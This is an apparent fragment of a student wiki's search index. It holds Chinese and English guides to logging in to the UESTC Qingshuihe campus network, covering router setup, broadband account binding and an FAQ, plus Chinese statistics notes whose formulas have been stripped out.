如果您不能打开 “自服务” 页面，说明您输入的统一身份认证账号和密码错误。 请确认您的手机卡没有欠费，宽带业务没有到期。 如果您能打开 “自服务” 页面，能绑定账号，但仍然不能使用 “电信登录” 或 “移动登录” 按钮登录校园网，说明您的宽带账号密码错误，或者被运营商冻结了。请联系运营商客服，说明您的账号无法登录校园网，并告诉他们您看到的报错信息。 我能打开校园网登录页面，但输入统一身份认证账号和密码后，不能打开自服务页面 您可以使用手机网络打开 统一身份认证平台，尝试重置密码。 如果的统一身份认证账号存在问题，请联系信息中心 61831184 解决。 我从本科生变成了研究生，有了新的学号，还需要重新绑定宽带账号吗？ 您的旧学号将很快被系统注销，您需要将宽带账号从旧学号迁移到新学号。 如果您的旧学号还能登录校园网，您需要在旧账号的 “自服务” 页面解绑宽带账号，然后在新账号的 “自服务” 页面绑定宽带账号。 如果您的旧学号已被注销，但是不能在新学号上绑定原来的宽带账号，请拨打 61831184 联系信息中心解决。 我打开了校园网登录页面，页面上显示我已成功登录，但我还是不能上网 请先按照第一条的方法检查是否有代理、VPN、加速器等软件打开。 请确保您没有从书签栏、历史记录或者收藏夹中打开登陆界面，您需要重新输入网址，并确保浏览器没有自动补全网址后面的参数。（具体来说，如果您把成功登录的界面保存到了书签栏，那么每次打开书签栏的网址都会带上之前成功登录的参数，导致您只是看到了成功登录的界面，实际上并没有登录） 上面的方法都试过了，仍然不能上网 请拨打 61831192 报修。"},{"title":"概统速通 - 统计","path":"/wiki/prob/stats.html","content":"样本 总体是随机变量 样本是一组随机变量 (随机向量) 简单随机样本独立与总体同分布 样本观测值是一组数值 样本统计量是样本的函数, 是随机变量或随机向量 (大写) 样本 阶原点矩 样本 阶中心矩 样本均值 样本方差 顺序统计量 最小统计量, 最大统计量 样本中位数 样本极差 样本统计值是数或向量 (小写) 样本的数字特征 定义 从总体 中抽取 个样本, 顺序统计量 的值 定义总体的经验分布函数 是具有分布函数性质的实函数 阶跃值为 1 / n 对于固定的 , 是样本的函数, 是一个统计量 定理 格列汶科定理 记 有 样本矩可用经验分布函数计算. 样本矩是随机变量, 总体矩是数值 定义 二维总体 的样本协方差 样本相关系数 定理 样本均值的精确分布 可处理小样问题 定理 顺序统计量 的概率密度 所有顺序统计量 的联合概率密度 排序破坏了样本的独立性 定理 极差 的概率密度 参数估计 定义 点估计: 总体 的分布函数 中参数 未知, , 由样本 建立统计量 将其统计值 作为 的估计值, 称 为 的点估计量. 矩估计 用样本矩替换相应的总体矩 用样本矩的函数替换总体矩的同一函数 令总体矩等于样本矩 极大似然估计 最大可能性准则: 选取参数使得样本观测值出现的可能性最大 构造似然函数 离散型 连续型 方便起见, 取对数 求导 解方程得到 的极大似然估计值 极大似然估计的结果可能与矩估计不同. 关键在于求出使得 取最大值的参数, 不一定要取对数和求导 估计量的优良性 无偏性 定义 无偏估计量 没有系统误差 渐进无偏估计量 样本均值是总体均值 的无偏估计量 样本方差 是总体方差 的有偏估计量 修正样本方差 是总体方差 的无偏估计量 已知总体均值 , 是总体方差 的无偏估计量 说明样本方差 是总体方差 的有偏估计量 有效性 定义 若同一参数的两个无偏估计量 称 比 更有效 的取值在 附近越密集越好 存在最小方差无偏估计量, 简称最优无偏估计量 定理 是 的无偏估计, , 是最有无偏估计量 的统计量 , 正态总体样本均值是总体均值的最优无偏估计量, 修正样本方差是总体方差的最优无偏估计量 定理 最优无偏估计量在概率为 1 的意义下唯一. 优效性 参数估计量的方差的下界 正态总体样本均值是总体均值的优效估计量, 修正样本方差是总体方差的渐进优效估计量 希望兼顾无偏性和有效性, 可使用 MSE 相合性 样本数量足够大时, 估计量稳定于真实值 定义 弱相合估计量 待估函数 的估计量 定义 强相合估计量 区间估计 对于 构造两个估计量 给定估计范围 尽量大 尽量小 奈曼-皮尔逊准则: 先确定能接受的可靠程度, 再尽量提高精确度. 定义 对未知参数的两个估计量 , 若 称 为 置信度为 的区间估计 置信水平 显著性水平 随机区间 以 的概率包含 . 反映了区间估计的可靠程度 枢轴变量法: 选取待估参数 的优良估计量 建立枢轴变量, 对选定的估计量构造函数 不包含其他任何参数, 可选用其他优良估计量替代位置参数, 替代参数后 将具有不同的分布. 参考 抽样分布定理. 确定 的分布. 通常构造 使其具有经典分布 根据 的分布, 查上侧分位数使得 成立 改写不等式得到 假设检验 假设检验基本思想: 提出统计假设, 根据小概率事件原理用类似反证法的思想对其进行检验. 假设检验的基本思路 参数假设检验 提出待检验假设 构造检验统计量. 说明, 为真时, 检验统计量服从某种分布. 参考 抽样分布定理. 计算本次抽样检验统计量观测值 看观测值是否落入否定域, 作出判断"},{"title":"Internet Guide (English)","path":"/wiki/uestc-internet/en.html","content":"Introduction This guide provides instructions on how to connect to the internet at the Qingshuihe Campus of the University of Electronic Science and Technology of China (UESTC). It covers different connection methods, common issues, and their solutions. The method of connection varies depending on the dormitory building. Dormitory Area The network in the dormitory area is provided by telecom operators, and the connection methods differ. Phase 1-4 Dormitories - China Mobile Fiber Broadband For International Students: Refer to the next section (Phase 5-6) please. The mobile fiber broadband in Phase 1-4 dormitories is provided by China Mobile and uses the PPPoE dial-up method for connection. In simple terms, you need to connect your router’s WAN port to the optical modem, set it to PPPoE dial-up mode, and enter your mobile broadband account and password. You can contact China Mobile staff for on-site network configuration. Frequently switching devices to access the network may result in your account being frozen. It is recommended to use a router for dialing rather than dialing directly on your computer. If your account is frozen, please contact China Mobile customer service to unfreeze it. Phase 5-6 Dormitories - China Mobile and China Telecom The China Mobile and China Telecom broadband in Phase 5-6 dormitories use a web-based authentication method. The steps are as follows: Connecting the Router You can connect to the network using a wireless router or by directly connecting your computer to the wall network port with an Ethernet cable. Using a wireless router allows multiple devices like phones and tablets to access the internet simultaneously. If you use an Ethernet cable to connect your computer, only the computer can use the campus network. In simple terms, you need to configure the router’s WAN port to DHCP mode. If you are unsure how to configure it, detailed instructions are provided below. Locate the wall network port, typically found under the desk and possibly blocked by a cabinet. Do not open the weak current box near the door and connect directly to the optical modem unless you cannot reach the wall network port. The optical fiber and power cables in the weak current box are fragile and easily damaged. If you open the weak current box and find that all the indicator lights on the optical modem are off, or if the SFP indicator is off or steady yellow, please call 61831192 for repair. Use an Ethernet cable to connect the router’s WAN port to the wall network port, or directly connect your computer to the wall network port. The WAN port is usually distinct (often at the end), with a unique color or label, while the other ports are LAN ports. Some routers do not distinguish between WAN and LAN ports; in such cases, any port will work. WAN Port and LAN Port After locating the WAN port, connect it to the network socket with an Ethernet cable as shown below. WAN Port to Network Socket Connect the router to a power source, turn it on, and wait for it to start up (this may take 1-2 minutes). If your computer has an Ethernet port, you can directly connect it to the router’s LAN port using an Ethernet cable. If not, connect to the router’s wireless network. The default WiFi name and password (if any) are written on the router’s label, as shown below: Router Label After connecting to the router, open a browser and enter the router’s management panel address in the address bar. The management address is usually listed on the router label and could be 192.168.1.1, tplogin.cn, miwifi.com, etc. Some routers automatically open the management page upon first connection. You may need to enter a default username and password, which can also be found on the router’s label. The router will then launch a setup wizard, where you can set your own WiFi name, password, and router management password. Follow your preferences for these settings. The important option is the WAN port setting (sometimes labeled as “Internet Settings” or “WAN Settings”), where you should select “自动获取 IP 地址” (Obtain an IP Address Automatically) or “DHCP”. Do not select “PPPoE”, “拨号上网”, or “静态 IP”. Once you complete the settings, the router may restart automatically, and you’ll need to reconnect to the router using the WiFi name and password you just set. Below is an example of a typical router’s “Internet Settings” page: Binding the Operator Account The first time you connect to the dormitory network, you need to bind your operator account to your unified identity authentication account as follows: In the dormitory area, connect your computer to the configured router or directly to the wall network port. The network login page may open automatically; if not, manually visit http://10.253.0.235. Enter your student ID and unified identity authentication password, then click “自服务” (Self Service). Click “多运营商绑定” (Carriers Bound) on the left. Select your operator (China Mobile or China Telecom), and click “绑定” (Bind). Enter your broadband account and password, then click “绑定” (Bind). After successful binding, you can view the bound account on the “Carriers Bound” page. Obtaining the Broadband Account For China Mobile users: If you need to reset your broadband account password, send a SMS message with content czkdmm to 10086, and you’ll receive you broadband account and its password. **You need to add _@cmccgx_ after the account name** when binding the broadband account. For instance, if your China Mobile phone number is 13812345678, text czkdmm to 10086, and you’ll receive your broadband account like SCXY13812345678, and a six-digit password. In the binding process, you should enter SCXY13812345678@cmccgx as the broadband account, and the six-digit password. For China Telecom users: The account is your phone number. Try the password 12345678 first. If it doesn’t work, please contact China Telecom customer service to reset your password. Logging into the Campus Network Once binding is complete, you can use your unified identity authentication account to log into the campus network as follows: Open a browser and visit any website to be automatically redirected to the login page. Alternatively, you can manually visit http://10.253.0.235. Enter your student ID and unified identity authentication password, and depending on your operator, click “移动登录” (Mobile Login) or “电信登录” (Telecom Login). When you see your IP address on the login page, you have successfully connected to the internet. Even with proper setup, you may need to log in again approximately once a week. Academic Buildings You can access the campus network via wireless or wired connections. Wireless Network Open your wireless network settings and connect to the UESTC-WiFi network. For first-time connections, open a browser and visit any website. This will automatically redirect you to the login page. Alternatively, you can manually visit http://wifi.uestc.edu.cn. Enter your student ID and unified identity authentication password, then click “校园网登录” (Campus Network Login). Wired Network Connect your computer to the wall network port using an Ethernet cable. Open a browser and visit any website to be automatically redirected to the login page. Alternatively, you can manually visit http://aaa.uestc.edu.cn or http://10.253.0.237. Enter your student ID and unified identity authentication password, then click “校园网登录” (Campus Network Login). When you see your IP address on the login page, you have successfully connected to the internet. Frequently Asked Questions I can’t open the login page, it says “Unable to connect to the website.” There could be several reasons for this. First, ensure that you have closed any proxy servers, VPNs, or accelerators before logging in. Open the Windows Settings app, select “Network &amp; Internet” -&gt; “Proxy,” and turn off the proxy server. In addition to the above proxy settings, VPN software such as WireGuard, EasyConnect, ZeroTier, and game accelerators must also be turned off. After successfully logging into the campus network, you can reopen these software programs. I frequently need to log in to the campus network again. UESTC-WiFi: Please ensure that the “Use random MAC address” or a similar option is turned off in the Wi-Fi details. Teaching Area Wired Network: The same account can only log in to one device at a time. If your account is logged in on another device, it will cause the previous device to go offline. You will also need to log in again after restarting the computer. Dormitory Network: Depending on the settings of the ISP, you usually need to log in again every week. Also, please check whether the wall network port is incorrectly connected to the LAN port. The ISP’s settings may also cause you to need to log in repeatedly; you will need to contact the ISP to resolve this. I can’t access certain servers in the teaching area from the dormitory, such as the library servers. There is a firewall between the dormitory network and the teaching area network, so some servers in the teaching area cannot be directly accessed. You can try using the UESTC VPN. Even when using the UESTC VPN, some servers may still be inaccessible. Please contact the server administrator or the information center for assistance. I set my router to DHCP or to obtain an IP address automatically, but the router says it cannot obtain an IP address, or it gets an IP address starting with 172. I can’t open the login page. Your optical modem may be malfunctioning. Please call 61831192 to request a repair. I use a router in my dormitory, but only one device can connect to the internet at a time. I need to log in again or cannot access the internet with other devices. Please make sure the WAN port of the router is connected to the wall network port, and the LAN port is connected to the computer or other devices. If the wall network port is mistakenly connected to the LAN port, only one device will be able to access the internet. I don’t know my broadband account or password. See Obtaining the Broadband Account. If you bind an incorrect account and password, there will be no prompt on the binding page. You will only see a login failure message after clicking the “电信登录” (Telecom Login) or “移动登录” (Mobile Login) button. Can I bind someone else’s broadband account? No. The bound broadband account must be your own. A broadband account can only be bound to one unified identity authentication account; otherwise, it will cause errors. I entered my account and password on the campus network login page and clicked “电信登录” (Telecom Login) or “移动登录” (Mobile Login), but a window popped up saying login failed, with an error code in English. Please ensure that you entered your unified identity authentication account and password, not the broadband account and password. Make sure you have bound the correct broadband account. After successful binding, you can check the bound account on the “自服务” (Self-service) -&gt; “多运营商绑定” (Carriers Bound) page. If you can’t open the “自服务” (Self-service) page, it means the unified identity authentication account and password you entered are incorrect. Please ensure your mobile card is not out of balance and your broadband service has not expired. If you can open the “自服务” (Self-service) page, bind the account, but still cannot log in using the “电信登录” (Telecom Login) or “移动登录” (Mobile Login) buttons on the campus network, it means your broadband account password is incorrect or has been frozen by the ISP. Please contact the ISP’s customer service, explain that your account cannot log in to the campus network, and tell them the error message you received. I can open the campus network login page, but after entering my unified identity authentication account and password, I cannot open the self-service page. You can use a mobile network to open the Unified Identity Authentication Platform and try to reset your password. If there is an issue with your unified identity authentication account, please contact the information center at 61831184. I have transitioned from an undergraduate to a graduate student and have a new student ID. Do I need to rebind my broadband account? Your old student ID will soon be deactivated by the system, and you need to transfer the broadband account from your old student ID to your new student ID. If your old student ID can still log in to the campus network, you need to unbind the broadband account on the “自服务” (Self-service) page of the old account, and then bind the broadband account on the “自服务” (Self-service) page of the new account. If your old student ID has been deactivated, but you cannot bind the original broadband account to the new student ID, please call 61831184 to contact the information center for assistance. I opened the campus network login page, and it shows that I have successfully logged in, but I still cannot access the internet. Please first check if any proxies, VPNs, or accelerators are open as mentioned in the first question. Ensure that you did not open the login page from the bookmarks bar, history, or favorites. You need to re-enter the URL and ensure that the browser does not automatically complete the parameters after the URL. (Specifically, if you saved the successfully logged-in page to the bookmarks bar, every time you open the URL from the bookmarks, it will include the parameters from the previous successful login, causing you to see the logged-in page without actually being logged in.) I’ve tried all the above methods, but I still can’t get online. Please call 61831192 to request a repair."}]